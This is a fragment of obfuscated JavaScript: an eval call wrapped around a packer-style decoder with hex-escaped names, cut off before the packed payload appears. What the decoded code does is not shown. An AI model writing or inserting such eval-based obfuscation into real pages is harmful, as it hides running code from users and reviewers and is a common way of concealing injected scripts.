...
window["\x65\x76\x61\x6c"](
  (function (Y$uC1, spo2, FDvsU3, OupdphW4, LbatK5, VFj6) {
    LbatK5 = function (FDvsU3) {
      return (
        (FDvsU3 < 62
          ? ""
          : LbatK5(window["\x70\x61\x72\x73\x65\x49\x6e\x74"](FDvsU3 / 62))) +
        ((FDvsU3 = FDvsU3 % 62) > 35
          ? window["\x53\x74\x72\x69\x6e\x67"][
              "\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65"
            ](FDvsU3 + 29)
          : FDvsU3["\x74\x6f\x53\x74\x72\x69\x6e\x67"](36))
      );
    };
    if ("\x30"["\x72\x65\x70\x6c\x61\x63\x65"](0, LbatK5) == 0) {
      while (FDvsU3--) VFj6[LbatK5(FDvsU3)] = OupdphW4[FDvsU3];
      OupdphW4 = [
        function (LbatK5) {
          return VFj6[LbatK5] || LbatK5;
        },
      ];
      LbatK5 = function () {
        return "\x28\x5b\x33\x34\x39\x61\x2d\x63\x66\x68\x6a\x2d\x6d\x6f\x2d\x72\x74\x2d\x76\x78\x2d\x7a\x41\x2d\x4d\x4f\x2d\x5a\x5d\x7c\x31\\\x77\x29";
      };
      FDvsU3 = 1;
    }
    while (FDvsU3--)
      if (OupdphW4[FDvsU3])
        Y$uC1 = Y$uC1["\x72\x65\x70\x6c\x61\x63\x65"](
          new window["\x52\x65\x67\x45\x78\x70"](
            "\\\x62" + LbatK5(FDvsU3) + "\\\x62",
            "\x67"
          ),
          OupdphW4[FDvsU3]
        );
